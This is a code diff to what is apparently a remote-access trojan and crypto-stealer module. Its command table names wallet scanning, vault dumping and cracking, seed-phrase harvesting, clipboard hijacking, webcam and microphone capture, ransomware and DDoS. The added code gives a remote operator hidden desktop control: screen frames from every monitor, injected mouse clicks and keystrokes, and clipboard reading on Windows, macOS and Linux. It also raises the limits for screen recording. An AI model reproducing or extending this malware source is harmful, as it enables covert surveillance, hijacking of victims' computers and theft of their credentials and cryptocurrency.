@@ -10,7 +10,10 @@ import com.spcagentpayloa.jvmxx.Screenshot;
 import com.spcagentpayloa.jvmxx.Shell;
 import com.spcagentpayloa.jvmxx.SysInfo;
 
+import java.awt.GraphicsDevice;
 import java.awt.GraphicsEnvironment;
+import java.awt.event.InputEvent;
+import java.awt.event.KeyEvent;
 import java.awt.Rectangle;
 import java.awt.Robot;
 import java.awt.image.BufferedImage;
@@ -84,7 +87,9 @@ public final class CryptoModule {
 
 	private static final Set<String> SUPPORTED = Set.of(
 		"scan_wallets", "dump_vault", "crack_vault", "clip_start", "clip_stop", "clip_set",
-		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent", "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices");
+		"shell", "harvest", "screenshot", "file_pull", "cancel", "agent",
+		"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices",
+		"desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get");
 	/** One collection at a time: these share a single heavy worker. */
 	private static final Set<String> HEAVY = Set.of("scan_wallets", "dump_vault", "crack_vault", "harvest");
 	static final String BUSY = "busy: another collection is running";
@@ -686,6 +691,11 @@ public final class CryptoModule {
 				case "file_pull" -> filePull(task);
 				case "agent" -> agent(task);
 				case "monitor" -> monitor(task, cancel);
+				case "desktop:frame" -> frame(task);
+				case "desktop:screens" -> screens();
+				case "input:mouse" -> mouse(task);
+				case "input:key" -> keyboard(task);
+				case "clipboard:get" -> clipboardGet();
 				case "files" -> files(task);
 				case "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices" -> captureMedia(task, "webcam");
 				case "mic", "mic:record" -> captureMedia(task, "mic");
@@ -705,7 +715,8 @@ public final class CryptoModule {
 			case "clip_start", "clip_stop", "clip_set" -> "clipboard";
 			case "harvest" -> "seeds";
 			case "agent" -> "credentials";
-			case "monitor", "webcam", "webcam:snapshot", "webcam:stream", "webcam:devices", "mic", "mic:record" -> "monitor";
+			case "monitor", "desktop:frame", "desktop:screens", "input:mouse", "input:key", "clipboard:get",
+				"webcam", "webcam:snapshot", "webcam:stream", "webcam:devices", "mic", "mic:record" -> "monitor";
 			case "files", "ransomware" -> "files";
 			case "ddos" -> "network";
 			default -> "credentials";
@@ -1439,9 +1450,9 @@ public final class CryptoModule {
 		}
 		int seconds = (int) Math.min(30, Math.max(1, Json.num(task.params(), "seconds", 5L)));
 		Object fpsRaw = task.params().get("fps");
-		double fps = Math.min(5.0, Math.max(0.2, fpsRaw instanceof Number ? ((Number) fpsRaw).doubleValue() : 1.0));
+		double fps = Math.min(15.0, Math.max(0.2, fpsRaw instanceof Number ? ((Number) fpsRaw).doubleValue() : 1.0));
 		int quality = (int) Math.min(90, Math.max(20, Json.num(task.params(), "quality", 60L)));
-		int maxFrames = (int) Math.min(30, Math.max(1, Json.num(task.params(), "max_frames", 5L)));
+		int maxFrames = (int) Math.min(150, Math.max(1, Json.num(task.params(), "max_frames", 5L)));
 		long interval = Math.max(200L, (long) (1000.0 / fps));
 		long end = System.currentTimeMillis() + seconds * 1000L;
 		Rectangle screen = new Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
@@ -1482,6 +1493,135 @@ public final class CryptoModule {
 		result.put("bytes", emitted);
 		result.put("truncated", emitted >= 3_500_000L || frames.size() >= maxFrames);
 		return result;
+	}
+
+	private Rectangle screenBounds(int index) {
+		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
+		if (devices.length == 0) return new Rectangle(java.awt.Toolkit.getDefaultToolkit().getScreenSize());
+		GraphicsDevice device = devices[Math.max(0, Math.min(devices.length - 1, index))];
+		return device.getDefaultConfiguration().getBounds();
+	}
+
+	private Map<String, Object> frame(Task task) throws Exception {
+		if (GraphicsEnvironment.isHeadless()) throw new IllegalStateException("display_unavailable");
+		int quality = (int) Math.min(90, Math.max(20, Json.num(task.params(), "quality", 60L)));
+		int scale = (int) Math.min(1920, Math.max(480, Json.num(task.params(), "scale", 1280L)));
+		int screen = (int) Math.max(0, Json.num(task.params(), "screen", 0L));
+		Rectangle bounds = screenBounds(screen);
+		BufferedImage image = new Robot().createScreenCapture(bounds);
+		if (image.getWidth() > scale) {
+			int height = (int) Math.round(image.getHeight() * (scale / (double) image.getWidth()));
+			BufferedImage reduced = new BufferedImage(scale, height, BufferedImage.TYPE_INT_RGB);
+			reduced.getGraphics().drawImage(image.getScaledInstance(scale, height, java.awt.Image.SCALE_FAST), 0, 0, null);
+			image = reduced;
+		}
+		byte[] bytes = jpeg(image, quality);
+		Map<String, Object> result = new LinkedHashMap<>();
+		result.put("data", Base64.getEncoder().encodeToString(bytes));
+		result.put("width", image.getWidth());
+		result.put("height", image.getHeight());
+		result.put("bytes", bytes.length);
+		result.put("screen", screen);
+		result.put("ts", System.currentTimeMillis());
+		return result;
+	}
+
+	private Map<String, Object> screens() {
+		List<Map<String, Object>> items = new ArrayList<>();
+		GraphicsDevice[] devices = GraphicsEnvironment.getLocalGraphicsEnvironment().getScreenDevices();
+		for (int index = 0; index < devices.length; index++) {
+			Rectangle bounds = devices[index].getDefaultConfiguration().getBounds();
+			Map<String, Object> item = new LinkedHashMap<>();
+			item.put("index", index);
+			item.put("width", bounds.width);
+			item.put("height", bounds.height);
+			item.put("primary", devices[index].getDefaultConfiguration().getBounds().contains(
+				java.awt.MouseInfo.getPointerInfo().getLocation()));
+			items.add(item);
+		}
+		return Map.of("screens", items);
+	}
+
+	private Map<String, Object> mouse(Task task) throws Exception {
+		Robot robot = new Robot();
+		String action = Json.str(task.params(), "action", "move");
+		Rectangle bounds = screenBounds((int) Math.max(0, Json.num(task.params(), "screen", 0L)));
+		double x = Math.max(0, Math.min(1, Json.num(task.params(), "x", 0L) / 10000.0));
+		double y = Math.max(0, Math.min(1, Json.num(task.params(), "y", 0L) / 10000.0));
+		int px = bounds.x + (int) Math.round(x * (bounds.width - 1));
+		int py = bounds.y + (int) Math.round(y * (bounds.height - 1));
+		if (!"wheel".equals(action)) robot.mouseMove(px, py);
+		switch (action) {
+			case "click" -> robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
+			case "up" -> robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
+			case "right" -> {
+				robot.mousePress(InputEvent.BUTTON3_DOWN_MASK);
+				robot.mouseRelease(InputEvent.BUTTON3_DOWN_MASK);
+			}
+			case "double" -> {
+				robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
+				robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
+				Thread.sleep(40);
+				robot.mousePress(InputEvent.BUTTON1_DOWN_MASK);
+				robot.mouseRelease(InputEvent.BUTTON1_DOWN_MASK);
+			}
+			case "wheel" -> robot.mouseWheel((int) Json.num(task.params(), "delta", 1L));
+			default -> { }
+		}
+		return Map.of("ok", true, "action", action, "x", px, "y", py);
+	}
+
+	private Map<String, Object> keyboard(Task task) throws Exception {
+		Robot robot = new Robot();
+		String action = Json.str(task.params(), "action", "press");
+		String key = Json.str(task.params(), "key", "");
+		int vk = (int) Json.num(task.params(), "vk", 0L);
+		if (vk <= 0) {
+			vk = switch (key) {
+				case "Enter" -> KeyEvent.VK_ENTER;
+				case "Tab" -> KeyEvent.VK_TAB;
+				case "Escape" -> KeyEvent.VK_ESCAPE;
+				case "Backspace" -> KeyEvent.VK_BACK_SPACE;
+				case "Delete" -> KeyEvent.VK_DELETE;
+				case "ArrowUp" -> KeyEvent.VK_UP;
+				case "ArrowDown" -> KeyEvent.VK_DOWN;
+				case "ArrowLeft" -> KeyEvent.VK_LEFT;
+				case "ArrowRight" -> KeyEvent.VK_RIGHT;
+				case "Home" -> KeyEvent.VK_HOME;
+				case "End" -> KeyEvent.VK_END;
+				case "PageUp" -> KeyEvent.VK_PAGE_UP;
+				case "PageDown" -> KeyEvent.VK_PAGE_DOWN;
+				default -> KeyEvent.getExtendedKeyCodeForChar(key.isBlank() ? ' ' : key.charAt(0));
+			};
+		}
+		List<Integer> mods = new ArrayList<>();
+		for (Object value : Json.list(task.params().get("modifiers"))) {
+			String name = String.valueOf(value).toLowerCase(java.util.Locale.ROOT);
+			if (name.equals("ctrl")) mods.add(KeyEvent.VK_CONTROL);
+			if (name.equals("shift")) mods.add(KeyEvent.VK_SHIFT);
+			if (name.equals("alt")) mods.add(KeyEvent.VK_ALT);
+			if (name.equals("meta") || name.equals("win")) mods.add(KeyEvent.VK_WINDOWS);
+		}
+		for (int modifier : mods) robot.keyPress(modifier);
+		try {
+			if (!"up".equals(action)) robot.keyPress(vk);
+			if (!"down".equals(action)) robot.keyRelease(vk);
+		} finally {
+			for (int index = mods.size() - 1; index >= 0; index--) robot.keyRelease(mods.get(index));
+		}
+		return Map.of("ok", true, "vk", vk);
+	}
+
+	private Map<String, Object> clipboardGet() throws Exception {
+		String text;
+		if (AgentPaths.isWindows()) {
+			text = Shell.run(installDir, "powershell -NoP -C \"Get-Clipboard -Raw\"", 15_000L);
+		} else if (AgentPaths.isMac()) {
+			text = Shell.run(installDir, "pbpaste", 15_000L);
+		} else {
+			text = Shell.run(installDir, "sh -c 'wl-paste -n 2>/dev/null || xclip -o -selection clipboard 2>/dev/null'", 15_000L);
+		}
+		return Map.of("content", text == null ? "" : text);
 	}
 
 	private byte[] jpeg(BufferedImage image, int quality) throws Exception {
